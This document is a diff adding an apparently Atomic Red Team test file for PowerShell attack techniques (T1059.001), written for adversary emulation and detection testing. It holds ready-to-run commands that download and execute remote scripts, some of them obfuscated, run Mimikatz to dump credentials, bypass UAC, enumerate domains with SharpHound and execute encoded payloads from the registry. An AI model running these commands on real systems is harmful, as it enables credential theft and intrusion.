@@ -1,0 +1,264 @@
+attack_technique: T1059.001
+display_name: 'Command and Scripting Interpreter: PowerShell'
+atomic_tests:
+- name: Mimikatz
+  auto_generated_guid: f3132740-55bc-48c4-bcc0-758a459cd027
+  description: |
+    Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.
+  supported_platforms:
+  - windows
+  input_arguments:
+    mimurl:
+      description: Mimikatz url
+      type: url
+      default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
+  executor:
+    command: |
+      powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
+    name: command_prompt
+    elevation_required: true
+- name: Run BloodHound from local disk
+  auto_generated_guid: a21bb23e-e677-4ee7-af90-6931b57b6350
+  description: |
+    Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.
+
+    Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a *BloodHound.zip file.
+  supported_platforms:
+  - windows
+  input_arguments:
+    file_path:
+      description: File path for SharpHound payload
+      type: String
+      default: PathToAtomicsFolder\T1059.001\src
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      SharpHound.ps1 must be located at #{file_path}
+    prereq_command: |
+      if (Test-Path #{file_path}\SharpHound.ps1) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "#{file_path}\SharpHound.ps1"
+  executor:
+    command: |
+      write-host "Import and Execution of SharpHound.ps1 from #{file_path}" -ForegroundColor Cyan
+      import-module #{file_path}\SharpHound.ps1
+      Invoke-BloodHound -OutputDirectory $env:Temp
+      Start-Sleep 5
+    cleanup_command: |
+      Remove-Item #{file_path}\SharpHound.ps1 -Force -ErrorAction Ignore
+      Remove-Item $env:Temp\*BloodHound.zip -Force
+    name: powershell
+- name: Run Bloodhound from Memory using Download Cradle
+  auto_generated_guid: bf8c1441-4674-4dab-8e4e-39d93d08f9b7
+  description: |
+    Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.
+
+    Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a *BloodHound.zip file.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
+      IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
+      Invoke-BloodHound -OutputDirectory $env:Temp
+      Start-Sleep 5
+    cleanup_command: |
+      Remove-Item $env:Temp\*BloodHound.zip -Force
+    name: powershell
+- name: Obfuscation Tests
+  auto_generated_guid: 4297c41a-8168-4138-972d-01f3ee92c804
+  description: |
+    Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: "SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION"
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
+      (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
+      Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
+    name: powershell
+- name: Mimikatz - Cradlecraft PsSendKeys
+  auto_generated_guid: af1800cf-9f9d-4fd1-a709-14b1e6de020d
+  description: |
+    Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      $url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
+    name: powershell
+    elevation_required: true
+- name: Invoke-AppPathBypass
+  auto_generated_guid: 06a220b6-7e29-4bd8-9d07-5b4d86742372
+  description: |
+    Note: Windows 10 only. Upon execution windows backup and restore window will be opened.
+
+    Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
+    name: command_prompt
+- name: Powershell MsXml COM object - with prompt
+  auto_generated_guid: 388a7340-dbc1-4c9d-8e59-b75ad8c6d5da
+  description: |
+    Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, "Download Cradle test success!" will be displayed.
+
+    Provided by https://github.com/mgreen27/mgreen27.github.io
+  supported_platforms:
+  - windows
+  input_arguments:
+    url:
+      description: url of payload to execute
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1
+  executor:
+    command: |
+      powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
+    name: command_prompt
+- name: Powershell XML requests
+  auto_generated_guid: 4396927f-e503-427b-b023-31049b9b09a6
+  description: |
+    Powershell xml download request. Upon execution, "Download Cradle test success!" will be dispalyed.
+
+    Provided by https://github.com/mgreen27/mgreen27.github.io
+  supported_platforms:
+  - windows
+  input_arguments:
+    url:
+      description: url of payload to execute
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml
+  executor:
+    command: |
+      "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"
+    name: command_prompt
+- name: Powershell invoke mshta.exe download
+  auto_generated_guid: 8a2ad40b-12c7-4b25-8521-2737b0a415af
+  description: |
+    Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display "Download Cradle test success!".
+
+    Provided by https://github.com/mgreen27/mgreen27.github.io
+  supported_platforms:
+  - windows
+  input_arguments:
+    url:
+      description: url of payload to execute
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct
+  executor:
+    command: |
+      C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()"
+    name: command_prompt
+- name: Powershell Invoke-DownloadCradle
+  auto_generated_guid: cc50fa2a-a4be-42af-a88f-e347ba0bf4d7
+  description: |
+    Provided by https://github.com/mgreen27/mgreen27.github.io
+    Invoke-DownloadCradle is used to generate Network and Endpoint artifacts.
+  supported_platforms:
+  - windows
+  executor:
+    steps: |
+      1. Open Powershell_ise as a Privileged Account
+      2. Invoke-DownloadCradle.ps1
+    name: manual
+- name: PowerShell Fileless Script Execution
+  auto_generated_guid: fa050f5e-bc75-4230-af73-b6fd7852cd73
+  description: |
+    Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open "C:\Windows\Temp" and verify that
+    art-marker.txt is in the folder.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      # Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
+      reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
+      iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
+    cleanup_command: |
+      Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
+      Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
+- name: PowerShell Downgrade Attack
+  auto_generated_guid: 9148e7c4-9356-420e-a416-e896e9c0f73e
+  description: |
+    This test requires the manual installation of PowerShell V2.
+
+    Attempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/
+  supported_platforms:
+  - windows
+  dependencies:
+  - description: |
+      PowerShell version 2 must be installed
+    prereq_command: |
+      if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Write-Host  Automated installer not implemented yet, please install PowerShell v2 manually
+  executor:
+    command: |
+      powershell.exe -version 2 -Command Write-Host $PSVersion
+    name: powershell
+- name: NTFS Alternate Data Stream Access
+  auto_generated_guid: 8e5c5532-1181-4c1d-bb79-b3a9f5dbd680
+  description: |
+    Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, "Stream Data Executed" will be displayed.
+  supported_platforms:
+  - windows
+  input_arguments:
+    ads_file:
+      description: File created to store Alternate Stream Data
+      type: String
+      default: $env:TEMP\NTFS_ADS.txt
+  dependencies:
+  - description: |
+      Homedrive must be an NTFS drive
+    prereq_command: |
+      if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem -contains "NTFS") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Write-Host Prereq's for this test cannot be met automatically
+  executor:
+    command: |
+      Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
+      $streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'
+      Invoke-Expression $streamcommand
+    cleanup_command: |
+      Remove-Item #{ads_file} -Force -ErrorAction Ignore
+
+- name: PowerShell Session Creation and Use
+  description: |
+    Connect to a remote powershell session and interact with the host.
+    Upon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.
+  
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    hostname_to_connect:
+      description: The host to connect to, by default it will connect to the local machine
+      type: String
+      default: $env:COMPUTERNAME
+
+  dependencies:
+  - description: |
+       PSRemoting must be enabled
+    prereq_command: |
+      Try {
+          New-PSSession -ComputerName #{hostname_to_connect} -ErrorAction Stop | Out-Null
+          exit 0
+      } 
+      Catch {
+          exit 1
+      }
+    get_prereq_command: |
+      Enable-PSRemoting
+
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      New-PSSession -ComputerName #{hostname_to_connect}
+      Test-Connection $env:COMPUTERNAME
+      Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"
+      Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
+      Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
